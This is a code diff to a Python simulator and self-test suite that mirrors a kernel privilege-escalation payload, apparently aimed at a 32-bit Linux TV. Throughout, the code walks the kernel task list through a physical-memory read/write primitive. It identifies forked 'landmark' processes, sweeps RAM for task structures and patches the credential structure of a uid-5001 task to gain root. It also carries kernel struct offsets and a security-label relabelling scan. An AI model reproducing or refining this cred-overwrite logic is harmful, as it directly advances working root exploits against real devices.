@@ -31,6 +31,7 @@ sys.path.insert(0, str(Path(__file__).resolve().parent))
 
 import kernel_root as K  # noqa: E402
 import physmap as T  # noqa: E402
+import smack_relabel as S  # noqa: E402
 
 PAGE = 0x1000
 OWNER_UID = 5001
@@ -411,7 +412,12 @@ def link_tasks_prev(rpc: MemRPC, init_phys: int, tail_first: list[int],
 
 def walk_prev(rpc: MemRPC, init_phys: int, init_virt: int,
               off: int = O_TASKS, hops: int = 200):
-    """Yield task virts walking init.tasks.prev."""
+    """Yield task virts walking init.tasks.prev.
+
+    A failed link read ends the walk, mirroring the payload's `catch { break; }`
+    (v44: needed to model a landmark whose pid page is unreadable - its own
+    tasks.prev link lands in the holed page).
+    """
     head = (init_virt + off) & 0xFFFFFFFF
     cur = rpc.read_u32(init_phys + off + 4)
     for _ in range(hops):
@@ -419,23 +425,39 @@ def walk_prev(rpc: MemRPC, init_phys: int, init_virt: int,
             return
         task = (cur - off) & 0xFFFFFFFF
         yield task
-        cur = rpc.read_u32(v2p(cur) + 4)
+        try:
+            cur = rpc.read_u32(v2p(cur) + 4)
+        except Exception:
+            return
 
 
-def task_pid(rpc: MemRPC, task_virt: int) -> int:
-    """Twin of payload `TaskPid`: pid when pid == tgid and plausible, else -1.
+# v44: the pid check is TRI-STATE, mirroring payload `PidRead`.
+PID_UNREADABLE = 0     # the read raised - the ONLY true read failure
+PID_OURS = 1           # pid == tgid == the pid fork() returned
+PID_NOT_OURS = 2       # readable but zero / disagreeing / high half
 
-    A forked landmark is its own group leader (pid == tgid); a pthread would
-    not be, which is why both words must agree.
+
+def task_pid(rpc: MemRPC, task_virt: int, want: int | None = None) -> tuple[int, int]:
+    """Twin of payload `TaskPid` (v44 tri-state). Returns (state, pid).
+
+    `want=None` keeps the pre-v43 convenience of "any coherent pid": the hunt
+    only calls this when a fork() pid is known, and the legacy-latch tests that
+    omit `expect_pid` model the payload before the rule existed.
+
+    v43 folded "the page did not read" and "it read a different pid" into one
+    -1; a freed landmark's pid/tgid words read 0 (a successful read) and fell
+    through to the legacy parent-uid latch - the stale-landmark hole v44 closes.
     """
     try:
         w = rpc.read_u32(v2p(task_virt) + O_PID)
         g = rpc.read_u32(v2p(task_virt) + O_TGID)
     except Exception:
-        return -1
-    if w != g or w == 0 or w > 0x7FFFFFFF:
-        return -1
-    return w
+        return PID_UNREADABLE, -1
+    if w == 0 or w != g or w > 0x7FFFFFFF:
+        return PID_NOT_OURS, -1
+    if want is None or w == want:
+        return PID_OURS, w
+    return PID_NOT_OURS, w
 
 
 def hunt_new_phyrfork(rpc: MemRPC, init_phys: int, init_virt: int,
@@ -449,35 +471,86 @@ def hunt_new_phyrfork(rpc: MemRPC, init_phys: int, init_virt: int,
     its comm equals `expect_tag` (the per-run "PHYRFORK"+hex(pid) name) or,
     failing that, when its pid/tgid words equal `expect_pid`.  A task whose
     pid/tgid are readable and different is a leftover landmark from an earlier
-    run and is REFUSED (counted in stats["stale"]) instead of patched.  Only a
-    task whose pid words are unreadable falls back to the legacy parent-uid
-    rule (v23: new landmark; a uid-5001 parent beats any other).
+    run and is REFUSED (counted in stats["stale"]) instead of patched.
+
+    v44: the accept is RANKED - exact tag (3) > pid/tgid (2) > legacy
+    parent-uid prefix (1) - and only a strictly better rank overwrites, because
+    the prev-chain order says nothing about freshness (v43 let a weaker accept
+    visited later replace an exact one).  The pid read is tri-state: only a
+    TRUE read failure falls back to the legacy rule; pid words that READ zero
+    (a freed task) are a refusal, not an unreadable page.
+
+    `expect_pid=None` models the pre-v43 payload (no pid check at all), so the
+    legacy latch tests keep their v23 semantics.
     """
     pre = pre or set()
     ours = maybe = 0
+    ours_rank = 0
     seen = skip = stale = 0
     how = "none"
     for task in walk_prev(rpc, init_phys, init_virt):
-        nm = rpc.read(v2p(task) + O_COMM, 16)
+        try:
+            nm = rpc.read(v2p(task) + O_COMM, 16)
+        except Exception:
+            # the payload's `catch { break; }`: one unreadable comm page ends the
+            # walk rather than skipping ahead (v44 twin fidelity)
+            break
         if nm.startswith(b"PHYRFORK") and task not in pre:
             seen += 1
             pu = child_parent_uid(rpc, task)
             name = nm.split(b"\x00", 1)[0]
-            tpid = task_pid(rpc, task) if expect_pid is not None else -1
+            rank = 0
             if expect_tag is not None and name == expect_tag:
-                ours, how = task, "exact"
-            elif tpid >= 0 and tpid == expect_pid:
-                ours, how = task, "pid"
-            elif tpid >= 0:
-                stale += 1
-            elif pu == OWNER_UID:
-                ours, how = task, "prefix"
+                rank = 3
             else:
-                skip += 1
-                maybe = task
+                state = PID_UNREADABLE
+                if expect_pid is not None:
+                    state, _ = task_pid(rpc, task, expect_pid)
+                if state == PID_OURS:
+                    rank = 2
+                elif state == PID_NOT_OURS:
+                    stale += 1
+                elif pu == OWNER_UID:
+                    rank = 1
+                else:
+                    skip += 1
+                    maybe = task
+            if rank > ours_rank:
+                ours, ours_rank = task, rank
+                how = {3: "exact", 2: "pid", 1: "prefix"}[rank]
     if stats is not None:
         stats.update(seen=seen, skip_orphan=skip, stale=stale, how=how)
     return (ours if ours else maybe), seen, skip
+
+
+def hunt_self(rpc: MemRPC, init_phys: int, init_virt: int,
+              self_tag: bytes, self_pid: int,
+              stats: dict | None = None) -> int:
+    """Twin of the payload's `self = task` selection (v44 ranked).
+
+    Ranks: exact per-run tag (3) > pid/tgid == our own pid (2) > legacy
+    "PHYSRPT" prefix (1), strictly-better-only.  v43 assigned `self` on every
+    match, so a stale PHYSRPT task later in the chain replaced us and the
+    self-patch then wrote THAT task's cred.
+    """
+    best = 0
+    rank = 0
+    for task in walk_prev(rpc, init_phys, init_virt):
+        try:
+            name = rpc.read(v2p(task) + O_COMM, 16).split(b"\x00", 1)[0]
+        except Exception:
+            # payload `catch { break; }`: keep the best accept so far, end here
+            break
+        if name == self_tag:
+            if rank < 3:
+                best, rank = task, 3
+        elif name.startswith(b"PHYSRPT"):
+            r = 2 if task_pid(rpc, task, self_pid)[0] == PID_OURS else 1
+            if r > rank:
+                best, rank = task, r
+    if stats is not None:
+        stats.update(how={3: "exact", 2: "pid", 1: "prefix", 0: "none"}[rank])
+    return best
 
 
 def kernel_uid(rpc, parent_virt: int) -> int:
@@ -597,7 +670,15 @@ def high_alloc_summary(samples, *, fast_mode: bool = True):
     return (fires and not saw_low and fast_mode, parent_out, cred_out, real_out, junk)
 
 
-PROBE_COMM = b"PHYSRPT1"
+# v44: the probe comm is a per-run tag, like the payload's, and longer than 8
+# bytes (any pid >= 0x10 gives 2+ hex digits).  The v38 twin kept the constant
+# b"PHYSRPT1", so its NUL-at-hit+8 check matched the fixture and stayed green
+# while the real payload's tag had a hex digit at byte 8 - the sweep could only
+# ever report "miss".  PROBE_PID's 5 hex digits also make the tag 12 bytes, so
+# the straddle fixture can put the NUL exactly on the page edge at an
+# 8-byte-aligned task (0xBF4 + 0x400 + 12 == 0x1000).
+PROBE_PID = 0x1A2B3
+PROBE_COMM = b"PHYSRPT" + format(PROBE_PID, "X").encode()
 PROBE_SPAN_PAGES = 4096
 SWEEP_LO = 0x20000000
 SWEEP_HI = 0x40000000     # the sweep stays inside proven RAM; the translated
@@ -624,19 +705,20 @@ def high_alloc_probe(rpc: MemRPC, child_virt: int, parent_virt: int, cred_virt: 
       not its page base) for our comm -> verdict "linear" means the read path
       got the right frame and still returned junk cred words;
     - otherwise sweeps proven RAM (SWEEP_LO..SWEEP_HI, +/- span_pages 4K pages
-      around the child's page) for the 8 name bytes ("PHYSRPT1") at ANY offset
+      around the child's page) for the per-run tag (PROBE_COMM) at ANY offset
       - tasks are slab objects, not page-aligned (0xe2df7300 sits at page
-      offset 0x300) - verifies the NUL follow-byte at hit+8 across the page
-      edge, takes the task as hit-0x400, and accepts it only when its children
-      list (task+O_CHILDREN, next OR prev) contains &child->sibling =
-      child+O_SIBLING: fork() links the sibling member, not tasks, and a freed
-      or unrelated look-alike fails this check.  Verdict "elsewhere" (wrong
-      translation; `at` is the TASK address and `cuid` says whether its cred
-      reads 5001, which would make a locate-and-patch read path possible),
-      "comm-only" (comm hits that failed the children check - includes a wrong
-      member assumption, hot/stale comms) or "miss" (check `cov`: the range
-      ACTUALLY read - the 2.5 s budget may stop a full-page sweep inside the
-      requested span; a miss is inconclusive, not evidence of absence);
+      offset 0x300) - verifies the NUL follow-byte one past the tag (hit +
+      len(tag)) across the page edge, takes the task as hit-0x400, and accepts
+      it only when its children list (task+O_CHILDREN, next OR prev) contains
+      &child->sibling = child+O_SIBLING: fork() links the sibling member, not
+      tasks, and a freed or unrelated look-alike fails this check.  Verdict
+      "elsewhere" (wrong translation; `at` is the TASK address and `cuid` says
+      whether its cred reads 5001, which would make a locate-and-patch read
+      path possible), "comm-only" (comm hits that failed the children check -
+      includes a wrong member assumption, hot/stale comms) or "miss" (check
+      `cov`: the range ACTUALLY read - the 2.5 s budget may stop a full-page
+      sweep inside the requested span; a miss is inconclusive, not evidence of
+      absence);
     - when the parent is low but the CRED is the high object, sweeps the same
       range for the ids pattern (every hit per page, offset-0..3 hits skipped
       without closing the page, as CredScanNear does; locate only, never
@@ -655,10 +737,10 @@ def high_alloc_probe(rpc: MemRPC, child_virt: int, parent_virt: int, cred_virt: 
     """
     child_phys = v2p(child_virt)
     cpage = child_phys & ~0xFFF
-    # Search the 8 name bytes per page and verify the NUL follow-byte at hit+8
-    # (one cross-page byte read, only on candidate hits).  A carry across pages
-    # would be order-dependent: the outward +/-step walk does NOT visit
-    # physically adjacent pages consecutively.
+    # Search the per-run tag per page and verify the NUL follow-byte one past
+    # it, at hit+len(tag) (one cross-page byte read, only on candidate hits).
+    # A carry across pages would be order-dependent: the outward +/-step walk
+    # does NOT visit physically adjacent pages consecutively.
     comm_pat = comm
     parent_high = kptr(parent_virt) and parent_virt >= 0xE0000000
 
@@ -733,7 +815,7 @@ def high_alloc_probe(rpc: MemRPC, child_virt: int, parent_virt: int, cred_virt: 
                     task_pa = hit_pa - O_COMM
                     if task_pa >= SWEEP_LO:
                         try:
-                            nul = rpc.read(hit_pa + 8, 1) == b"\x00"
+                            nul = rpc.read(hit_pa + len(comm_pat), 1) == b"\x00"
                         except Exception:
                             nul = False
                         if nul:
@@ -823,7 +905,9 @@ def direct_parent_patch(rpc, child_virt: int, *, beacon,
     """Twin of the payload's direct-parent block (Program.cs, v28–v29).
 
     Walks child->real_parent (0x2F0) / ->parent (0x2F4), reads the parent's
-    cred/real_cred, patches ONLY a cred whose uid reads 5001, and records the
+    cred/real_cred, and patches a cred only when its uid reads 5001 **and**
+    cred == real_cred (v43 `SameCredPair`; real_cred is never patched by itself),
+    then records the
     v24 `direct-probe` diagnostics when the gate stays closed (probe_prs = first
     and last retry).  v28's early break is modelled: after three retries that
     never saw a kernel pointer in cred/real_cred, stop re-reading the dead
@@ -872,13 +956,18 @@ def direct_parent_patch(rpc, child_virt: int, *, beacon,
             if kptr(cred) or kptr(real):
                 saw_kptr = True
             u = cred_uid(rpc, cred)
-            if u == OWNER_UID:
+            # v43: a cred is written only when cred == real_cred (SameCredPair),
+            # and the payload never patches real_cred by itself.  This twin kept
+            # the pre-v43 behaviour (patch `cred` on 5001, then patch `real`
+            # independently) until 2026-10-31 - the exact split-pair path v43
+            # closed, so the offline oracle endorsed a write the TV refuses.
+            pair_ok = cred != 0 and cred == real
+            if u == OWNER_UID and pair_ok:
                 beacon(f"direct-parent+{po:x}={parent:08x} cred={cred:08x}")
                 if not patch_gate(rpc, cred):
                     beacon(f"direct-patch-fail po={po:x} cred={cred:08x}")
-            if kptr(real) and real != cred and cred_uid(rpc, real) == OWNER_UID:
-                if not patch_gate(rpc, real):
-                    beacon(f"direct-patch-fail real={real:08x}")
+            elif u == OWNER_UID or cred_uid(rpc, real) == OWNER_UID:
+                beacon(f"skip cred!=real po={po:x} c={cred:08x} r={real:08x}")
             # The probes are silent on success; on the failure path they say
             # WHICH read was wrong: uid 0 = stale zeros, a number = stale word,
             # unread = cred pointer not a kptr or the cred page unreadable,
@@ -1371,24 +1460,176 @@ def selftest() -> int:
         f"child={child43b:#x} new={new43b_v:#x} how={st43b['how']} "
         f"stale={st43b['stale']}",
     )
-    # Unreadable pid words (a kernel where the offset does not read): the legacy
-    # parent-uid rule must still latch, or a cold boot could regress.
+    # v44: a TRUE read failure is the only case that keeps the legacy
+    # parent-uid latch.  v43's version of this test planted `pid=None` (zero
+    # words) - that is a successful READ of the freed-task shape, and it
+    # exercised the accept-on-pid=0 hole this version closes.  Model the real
+    # failure with an RPC hole over the page holding pid/tgid: the task sits at
+    # page offset 0xD10 so its pid/tgid land in the holed page while comm,
+    # cred and the parent pointers land in the next, readable page.
     r43c = MemRPC()
     ip43c = 0x20E00000
-    par43c_p, leg43c_p = 0x20E01000, 0x20E02000
-    c43c = plant_cred(r43c, 0x20E03000, uid=5001, gid=100, usage=4)
+    par43c_p = 0x20E01000
+    leg43c_p = 0x20E02D10          # pid/tgid -> 0x20E02FF8, rest -> 0x20E03000+
+    c43c = plant_cred(r43c, 0x20E04000, uid=5001, gid=100, usage=4)
     plant_task(r43c, par43c_p, b"PHYSRPT777", c43c)
     leg43c_v = plant_task(r43c, leg43c_p, b"PHYRFORK", c43c,
                           parent_phys=par43c_p)
     iv43c = link_tasks_prev(r43c, ip43c, [leg43c_p])
+    r43c.holes.add(0x20E02000)     # the pid words; comm/cred/parents untouched
     st43c: dict = {}
     child43c, _s43c, _k43c = hunt_new_phyrfork(
         r43c, ip43c, iv43c, pre=set(),
         expect_tag=b"PHYRFORK777", expect_pid=777, stats=st43c)
     failed += not _check(
-        "v43 falls back to the legacy parent-uid latch when pid is unreadable",
-        child43c == leg43c_v and st43c["how"] == "prefix",
-        f"child={child43c:#x} legacy={leg43c_v:#x} how={st43c['how']}",
+        "v44 read failure (not pid=0) keeps the legacy parent-uid latch",
+        child43c == leg43c_v and st43c["how"] == "prefix" and st43c["stale"] == 0,
+        f"child={child43c:#x} legacy={leg43c_v:#x} how={st43c['how']} "
+        f"stale={st43c['stale']}",
+    )
+
+    # v44: a READABLE pid that is zero is a died/freed landmark, not an
+    # unreadable page.  Its real_parent still points at the app's old task, so
+    # `pu == 5001` would have accepted it in v43.
+    r44 = MemRPC()
+    ip44 = 0x20F00000
+    par44_p, z44_p = 0x20F01000, 0x20F02000
+    c44 = plant_cred(r44, 0x20F03000, uid=5001, gid=100, usage=4)
+    plant_task(r44, par44_p, b"PHYSRPT1234", c44)
+    plant_task(r44, z44_p, b"PHYRFORK", c44, parent_phys=par44_p, pid=0)
+    iv44 = link_tasks_prev(r44, ip44, [z44_p])
+    st44: dict = {}
+    child44, _s44, _k44 = hunt_new_phyrfork(
+        r44, ip44, iv44, pre=set(),
+        expect_tag=b"PHYRFORK902", expect_pid=0x902, stats=st44)
+    failed += not _check(
+        "v44 refuses a readable pid=0 even when the parent uid reads 5001",
+        child44 == 0 and st44["how"] == "none" and st44["stale"] == 1,
+        f"child={child44:#x} how={st44['how']} stale={st44['stale']}",
+    )
+
+    # v44: ... and the same for a readable-but-different pid.
+    r44b = MemRPC()
+    ip44b = 0x20F80000
+    par44b_p, m44_p = 0x20F81000, 0x20F82000
+    c44b = plant_cred(r44b, 0x20F83000, uid=5001, gid=100, usage=4)
+    plant_task(r44b, par44b_p, b"PHYSRPT1235", c44b)
+    plant_task(r44b, m44_p, b"PHYRFORK", c44b, parent_phys=par44b_p, pid=0x1234)
+    iv44b = link_tasks_prev(r44b, ip44b, [m44_p])
+    st44b: dict = {}
+    child44b, _s44b, _k44b = hunt_new_phyrfork(
+        r44b, ip44b, iv44b, pre=set(),
+        expect_tag=b"PHYRFORK902", expect_pid=0x902, stats=st44b)
+    failed += not _check(
+        "v44 refuses a readable pid that is not this run's",
+        child44b == 0 and st44b["how"] == "none" and st44b["stale"] == 1,
+        f"child={child44b:#x} how={st44b['how']} stale={st44b['stale']}",
+    )
+
+    # v44: ranked accept.  The prev-chain order is not freshness, so a weaker
+    # accept visited LATER must not replace an exact tag (v43 overwrote).
+    r_cl = MemRPC()
+    ip_cl = 0x21000000
+    c_cl = plant_cred(r_cl, 0x21003000, uid=5001, gid=100, usage=4)
+    exact_cl_p, pid_cl_p = 0x21001000, 0x21002000
+    exact_cl_v = plant_task(r_cl, exact_cl_p, b"PHYRFORK555", c_cl, pid=0x555)
+    plant_task(r_cl, pid_cl_p, b"PHYRFORK", c_cl, pid=0x555)   # tag not landed
+    iv_cl = link_tasks_prev(r_cl, ip_cl, [exact_cl_p, pid_cl_p])
+    st_cl: dict = {}
+    child_cl, _s_cl, _k_cl = hunt_new_phyrfork(
+        r_cl, ip_cl, iv_cl, pre=set(),
+        expect_tag=b"PHYRFORK555", expect_pid=0x555, stats=st_cl)
+    failed += not _check(
+        "v44 a later pid accept cannot clobber an earlier exact tag",
+        child_cl == exact_cl_v and st_cl["how"] == "exact",
+        f"child={child_cl:#x} exact={exact_cl_v:#x} how={st_cl['how']}",
+    )
+
+    # v44: ... and a later legacy (prefix) accept cannot clobber it either.
+    # The prefix candidate's pid page is unreadable (the only prefix path left),
+    # so its real_parent/comm sit in the next page at offset 0xD10.
+    r_pf = MemRPC()
+    ip_pf = 0x21100000
+    c_pf = plant_cred(r_pf, 0x21105000, uid=5001, gid=100, usage=4)
+    exact_pf_p, pfx_pf_p = 0x21101000, 0x21102000 + 0xD10
+    par_pf_p = 0x21104000
+    plant_task(r_pf, par_pf_p, b"PHYSRPT789", c_pf)
+    exact_pf_v = plant_task(r_pf, exact_pf_p, b"PHYRFORK555", c_pf, pid=0x555)
+    plant_task(r_pf, pfx_pf_p, b"PHYRFORK", c_pf, parent_phys=par_pf_p)
+    iv_pf = link_tasks_prev(r_pf, ip_pf, [exact_pf_p, pfx_pf_p])
+    r_pf.holes.add(0x21102000)
+    st_pf: dict = {}
+    child_pf, _s_pf, _k_pf = hunt_new_phyrfork(
+        r_pf, ip_pf, iv_pf, pre=set(),
+        expect_tag=b"PHYRFORK555", expect_pid=0x555, stats=st_pf)
+    failed += not _check(
+        "v44 a later legacy prefix accept cannot clobber an earlier exact tag",
+        child_pf == exact_pf_v and st_pf["how"] == "exact" and st_pf["stale"] == 0,
+        f"child={child_pf:#x} exact={exact_pf_v:#x} how={st_pf['how']}",
+    )
+
+    # v44: the self accept is ranked too.  A stale PHYSRPT task later in the
+    # chain used to replace us and get its cred patched.
+    r_st = MemRPC()
+    ip_st = 0x21200000
+    c_st = plant_cred(r_st, 0x21203000, uid=5001, gid=100, usage=4)
+    stale_st_p, me_st_p = 0x21201000, 0x21202000
+    plant_task(r_st, stale_st_p, b"PHYSRPT777", c_st, pid=0x777)     # earlier run
+    me_st_v = plant_task(r_st, me_st_p, b"PHYSRPT1A2B", c_st, pid=0x1A2B)
+    iv_st = link_tasks_prev(r_st, ip_st, [me_st_p, stale_st_p])
+    st_st: dict = {}
+    got_st = hunt_self(r_st, ip_st, iv_st, b"PHYSRPT1A2B", 0x1A2B, stats=st_st)
+    failed += not _check(
+        "v44 self: an exact per-run tag beats a later legacy PHYSRPT task",
+        got_st == me_st_v and st_st["how"] == "exact",
+        f"self={got_st:#x} me={me_st_v:#x} how={st_st['how']}",
+    )
+    # ... and an exact tag visited LATER upgrades a legacy match.
+    iv_st2 = link_tasks_prev(r_st, ip_st, [stale_st_p, me_st_p])
+    st_st2: dict = {}
+    got_st2 = hunt_self(r_st, ip_st, iv_st2, b"PHYSRPT1A2B", 0x1A2B, stats=st_st2)
+    failed += not _check(
+        "v44 self: a later exact tag upgrades the legacy match",
+        got_st2 == me_st_v and st_st2["how"] == "exact",
+        f"self={got_st2:#x} how={st_st2['how']}",
+    )
+    # ... and our own pid/tgid outranks a legacy tag with a foreign pid.
+    r_st3 = MemRPC()
+    ip_st3 = 0x21300000
+    c_st3 = plant_cred(r_st3, 0x21303000, uid=5001, gid=100, usage=4)
+    foreign_st_p, mine_st_p = 0x21301000, 0x21302000
+    plant_task(r_st3, foreign_st_p, b"PHYSRPT777", c_st3, pid=0x777)
+    mine_st_v = plant_task(r_st3, mine_st_p, b"PHYSRPT", c_st3, pid=0x1A2B)
+    iv_st3 = link_tasks_prev(r_st3, ip_st3, [foreign_st_p, mine_st_p])
+    st_st3: dict = {}
+    got_st3 = hunt_self(r_st3, ip_st3, iv_st3, b"PHYSRPT1A2B", 0x1A2B, stats=st_st3)
+    failed += not _check(
+        "v44 self: our pid/tgid beats a legacy tag with a foreign pid",
+        got_st3 == mine_st_v and st_st3["how"] == "pid",
+        f"self={got_st3:#x} mine={mine_st_v:#x} how={st_st3['how']}",
+    )
+
+    # v44: an unreadable comm page ENDS the walk (payload `catch { break; }`) -
+    # the twin used to raise out of the generator instead, and a future fixture
+    # would have modelled "skip ahead" rather than the payload's stop.
+    r_sh = MemRPC()
+    ip_sh = 0x21400000
+    c_sh = plant_cred(r_sh, 0x21404000, uid=5001, gid=100, usage=4)
+    me_sh_p, holed_sh_p = 0x21401000, 0x21402C00   # holed task: comm at 0x21403000
+    me_sh_v = plant_task(r_sh, me_sh_p, b"PHYSRPT1A2B", c_sh, pid=0x1A2B)
+    plant_task(r_sh, holed_sh_p, b"PHYSRPT999", c_sh, pid=0x999)
+    iv_sh = link_tasks_prev(r_sh, ip_sh, [me_sh_p, holed_sh_p])
+    r_sh.holes.add(0x21403000)
+    st_sh: dict = {}
+    raised = None
+    try:
+        got_sh = hunt_self(r_sh, ip_sh, iv_sh, b"PHYSRPT1A2B", 0x1A2B, stats=st_sh)
+    except Exception as exc:          # noqa: BLE001 - the failure mode under test
+        got_sh, raised = 0, exc
+    failed += not _check(
+        "v44 self: an unreadable comm page ends the walk (payload catch/break)",
+        got_sh == me_sh_v and raised is None,
+        f"self={got_sh:#x} me={me_sh_v:#x} raised={raised!r}",
     )
 
     # v17 cache alias: write is visible in the mapping, kernel RAM is not,
@@ -1634,6 +1875,47 @@ def selftest() -> int:
         "nothing written",
     )
 
+    # v43 pair rule (mirrored 2026-10-31): a cred whose real_cred is a DIFFERENT
+    # pointer is refused.  The twin patched `cred` on 5001 and then patched
+    # `real` independently, so it endorsed the split-pair write the payload
+    # stopped doing in v43.
+    s9 = MemRPC()
+    p9, c9 = 0x21400000, 0x21401000
+    pcr9 = plant_cred(s9, 0x21402000, uid=5001, gid=100, usage=4)
+    other9 = plant_cred(s9, 0x21403000, uid=1234, gid=1000, usage=4)
+    plant_task(s9, p9, b"PHYSRPT1", pcr9)
+    s9.write32(p9 + O_REAL_CRED, (other9 + PHYS_OFF) & 0xFFFFFFFF)
+    cv9 = plant_task(s9, c9, b"PHYRFORK", pcr9, parent_phys=p9)
+    b9: list[str] = []
+    rooted9, _probes9 = direct_parent_patch(s9, cv9, beacon=b9.append)
+    failed += not _check(
+        "direct-parent: a split cred pair is refused (v43 SameCredPair)",
+        not rooted9 and s9.read_u32(pcr9 + O_UID) == OWNER_UID
+        and s9.read_u32(other9 + O_UID) == 1234
+        and any(x.startswith("skip cred!=real") for x in b9),
+        f"rooted={rooted9} cred_uid={s9.read_u32(pcr9 + O_UID)} "
+        f"real_uid={s9.read_u32(other9 + O_UID)} beacons={b9[:3]}",
+    )
+
+    # ...and a uid-5001 real_cred alone is never patched: the payload writes
+    # `cred` only, so the mismatch must leave the real_cred object untouched.
+    s10 = MemRPC()
+    p10, c10 = 0x21500000, 0x21501000
+    pcr10 = plant_cred(s10, 0x21502000, uid=5001, gid=100, usage=4)
+    plant_task(s10, p10, b"PHYSRPT1", pcr10)
+    s10.write32(p10 + O_CRED, 0)
+    s10.write32(p10 + O_REAL_CRED, (pcr10 + PHYS_OFF) & 0xFFFFFFFF)
+    cv10 = plant_task(s10, c10, b"PHYRFORK", pcr10, parent_phys=p10)
+    b10: list[str] = []
+    rooted10, _probes10 = direct_parent_patch(s10, cv10, beacon=b10.append)
+    failed += not _check(
+        "direct-parent: real_cred alone is never patched",
+        not rooted10 and s10.read_u32(pcr10 + O_UID) == OWNER_UID
+        and any(x.startswith("skip cred!=real") for x in b10),
+        f"rooted={rooted10} real_uid={s10.read_u32(pcr10 + O_UID)} "
+        f"beacons={b10[:3]}",
+    )
+
     # v28 cred-scan fallback (docs/OPEN-ISSUES.md, cold boot on v27): the
     # parent task's cred-pointer line reads stale, but cred pages read
     # coherently and our cred is a cred_jar neighbour of the child's fork copy.
@@ -1719,6 +2001,19 @@ def selftest() -> int:
         f"patched={patched9} total={budget9[0]} second={patched9b} "
         "(10 foreign creds; budget 8, shared across calls)",
     )
+    # iter_owner_creds(limit=) is tv_rootwatch's process-wide budget: it must
+    # stop after N hits (and drain the batch - not observable through MemRPC,
+    # but the yield count is).  Before 2026-10-31 tv_rootwatch broke out of the
+    # generator instead, abandoning up to 16 MiB of queued pages and then
+    # writing op5 onto that socket.
+    r_lim = MemRPC()
+    for i in range(4):
+        plant_cred(r_lim, 0x21800000 + i * 0x1000)
+    got_lim = list(K.iter_owner_creds(r_lim, 0x21800000, 0x21900000, limit=2))
+    failed += not _check(
+        "iter_owner_creds(limit) stops after N hits (watchdog budget)",
+        len(got_lim) == 2, f"got {len(got_lim)} yields",
+    )
     # v30 fidelity: a cred whose ids start exactly at a page boundary puts a
     # pattern hit at page offset 0 (cred at page-4).  That hit is still refused,
     # but it must not close the page: a later cred on the same page has to be
@@ -1755,7 +2050,7 @@ def selftest() -> int:
 
     def plant_parent(r, parent_p, child_v, *, link_children=True):
         pcred = plant_cred(r, parent_p - 0x12000)
-        pv = plant_task(r, parent_p, b"PHYSRPT1", pcred)
+        pv = plant_task(r, parent_p, PROBE_COMM, pcred)
         if link_children:
             # fork() links &child->sibling into parent->children (next AND prev
             # hold it when it is the only child)
@@ -1794,12 +2089,12 @@ def selftest() -> int:
         f"at={h['at']:#x} pc={h['pc']} cuid={h['cuid']}",
     )
 
-    # comm-only: a PHYSRPT1 task in range whose children list does NOT link the
-    # child's sibling member (e.g. the old wrong child+tasks assumption)
+    # comm-only: a PROBE_COMM task in range whose children list does NOT link
+    # the child's sibling member (e.g. the old wrong child+tasks assumption)
     r, child_p, child_v = probe_scene()
     r.write32(child_p + O_REAL_PARENT, P_HI)
     decoy = 0x26D00300
-    plant_task(r, decoy, b"PHYSRPT1", plant_cred(r, decoy - 0x12000))
+    plant_task(r, decoy, PROBE_COMM, plant_cred(r, decoy - 0x12000))
     r.write32(decoy + O_CHILDREN, child_v + O_TASKS)   # wrong member on purpose
     h = high_alloc_probe(r, child_v, P_HI, 0)
     failed += not _check(
@@ -1808,15 +2103,16 @@ def selftest() -> int:
         f"hits={h['hits']}",
     )
 
-    # straddle: the task at page+0xBF8 puts its comm at page+0xFF8, crossing
-    # the page edge; the 8-byte carry must not lose it
+    # straddle: the tag ends exactly on the page edge, so its NUL follow-byte
+    # (verified at hit+len(tag), v44) is the byte read from the NEXT page.
+    # 0xBF4 + O_COMM + len(PROBE_COMM) == 0x1000, and the task stays aligned.
     r, child_p, child_v = probe_scene()
     r.write32(child_p + O_REAL_PARENT, P_HI)
-    straddle_p = 0x26C00BF8
+    straddle_p = 0x26C00BF4
     plant_parent(r, straddle_p, child_v)
     h = high_alloc_probe(r, child_v, P_HI, 0)
     failed += not _check(
-        "high-scan finds a page-straddling comm (carry)",
+        "high-scan finds a comm whose NUL crosses the page edge (v44 tag length)",
         h["verdict"] == "elsewhere" and h["at"] == straddle_p
         and h["cuid"] == OWNER_UID,
         f"task at {h['at']:#x}",
@@ -1914,6 +2210,23 @@ def selftest() -> int:
         cred_uid(r, (0x26200000 + PHYS_OFF) & 0xFFFFFFFF) == OWNER_UID
         and cred_uid(r, r.read_u32(v2p(child_v) + O_CRED)) == OWNER_UID,
         "no Write32/PatchCred on the diagnostic path",
+    )
+
+    # ---- smack_relabel --scan fallback: the tag scan must return VAs --------
+    # find_stub_task()/find_child_by_head() yield kernel VAs and
+    # find_task_smack_by_name() applies phys() itself.  The scan used to return
+    # the physical address it had scanned, so --scan read phys(PA) - a wrong,
+    # usually unmapped frame - and could never match a task (2026-10-31).
+    r_sm = MemRPC()
+    sm_cred = plant_cred(r_sm, 0x21602000, uid=5001, gid=100, usage=4)
+    sm_task_phys = 0x21601300
+    plant_task(r_sm, sm_task_phys, b"PHYSRPC1", sm_cred)
+    sm_got = S.find_tasks_by_tag_scan(r_sm, lo=0x21601000, hi=0x21602000)
+    sm_want = (sm_task_phys + PHYS_OFF) & 0xFFFFFFFF
+    failed += not _check(
+        "smack_relabel tag scan returns kernel VAs (the label matcher applies phys())",
+        sm_got == [sm_want],
+        f"got={[hex(x) for x in sm_got]} want={sm_want:#x}",
     )
 
     # v20: reopen AFTER fork while the child still holds the fd.
